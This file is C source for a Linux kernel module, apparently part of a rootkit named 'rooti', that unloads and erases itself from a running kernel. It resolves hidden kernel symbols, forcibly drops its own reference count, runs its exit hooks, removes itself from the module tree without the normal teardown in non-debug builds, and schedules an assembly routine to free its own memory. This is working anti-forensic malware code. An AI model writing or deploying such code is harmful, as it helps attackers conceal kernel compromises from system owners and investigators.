#include <linux/workqueue.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/notifier.h>
#include <linux/async.h>
#include "unloading.h"
#include "../config.h"
#include "../utils.h"

// Implemented in asm/unloading.S
void rooti_free_mod_mem(struct work_struct *work);
DECLARE_WORK(rooti_mem_free_work, rooti_free_mod_mem);

void *rooti_text_section_base = NULL;
void *rooti_data_section_base = NULL;
void *rooti_rodata_section_base = NULL;

#define MODULE_REF_BASE 1

// Directly copied from the kernel
static int __try_release_module_ref(struct module *mod)
{
	int ret = atomic_sub_return(MODULE_REF_BASE, &mod->refcnt);
	BUG_ON(ret < 0);
	if (ret)
		ret = atomic_add_unless(&mod->refcnt, MODULE_REF_BASE, 0);

	return ret;
}

// Similar to the kernel's free_module()
static int rooti_self_free(void)
{
    ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
    ROOTI_RESOLVE_FUNC_ADDR(mod_sysfs_teardown, -ENOENT, void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(module_arch_cleanup, -ENOENT, void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(module_unload_free, -ENOENT, void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(destroy_params, -ENOENT, void, const struct kernel_param *, unsigned);
    ROOTI_RESOLVE_FUNC_ADDR(mod_tree_remove, -ENOENT, void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(module_bug_cleanup, -ENOENT, void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(module_arch_freeing_init, -ENOENT, void, struct module *);

#ifdef ROOTI_DEBUG_SHOWME
    __mod_sysfs_teardown(THIS_MODULE);
#endif

    mutex_lock(__module_mutex);
    THIS_MODULE->state = MODULE_STATE_UNFORMED;
    mutex_unlock(__module_mutex);

    __module_arch_cleanup(THIS_MODULE);

    __module_unload_free(THIS_MODULE);

    __destroy_params(THIS_MODULE->kp, THIS_MODULE->num_kp);

    mutex_lock(__module_mutex);

#ifdef ROOTI_DEBUG_SHOWME
    list_del_rcu(&THIS_MODULE->list);
#endif

    __mod_tree_remove(THIS_MODULE);

    __module_bug_cleanup(THIS_MODULE);

    synchronize_rcu();

    mutex_unlock(__module_mutex);

    __module_arch_freeing_init(THIS_MODULE);

    kfree(THIS_MODULE->args);

    // Inlined percpu_modfree()
    free_percpu(THIS_MODULE->percpu);

    return 0;
}

// Similar to the kernel's sys_delete_module() but modified to unload self
static int rooti_self_uninitialize(void)
{
	ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
	ROOTI_RESOLVE_SYM_ADDR(struct blocking_notifier_head *, module_notify_list, -ENOENT);
	ROOTI_RESOLVE_FUNC_ADDR(klp_module_going, -ENOENT, void, struct module *);
	ROOTI_RESOLVE_FUNC_ADDR(ftrace_release_mod, -ENOENT, void, struct module *);

	// Signals are not expected as this runs in the background
	mutex_lock(__module_mutex);

	if (THIS_MODULE->state != MODULE_STATE_LIVE) {
	    mutex_unlock(__module_mutex);
	    return -EBUSY;
	}

	// Inlined and modified version of try_stop_module().
	// We always want to unload forcefully
	__try_release_module_ref(THIS_MODULE);
	THIS_MODULE->state = MODULE_STATE_GOING;

	mutex_unlock(__module_mutex);

	THIS_MODULE->exit();

	blocking_notifier_call_chain(__module_notify_list, MODULE_STATE_GOING, THIS_MODULE);

	__klp_module_going(THIS_MODULE);
	__ftrace_release_mod(THIS_MODULE);

	async_synchronize_full();

	return rooti_self_free();
}

int rooti_self_destruct(void)
{
    int err;

    rooti_text_section_base = THIS_MODULE->mem[MOD_TEXT].base;
    rooti_data_section_base = THIS_MODULE->mem[MOD_DATA].base;
    rooti_rodata_section_base = THIS_MODULE->mem[MOD_RODATA].base;

    err = rooti_self_uninitialize();
    if (err) {
        return err;
    }

    // Schedule background work to cleanup the module's memory
	queue_work(system_long_wq, &rooti_mem_free_work);
	return 0;
}
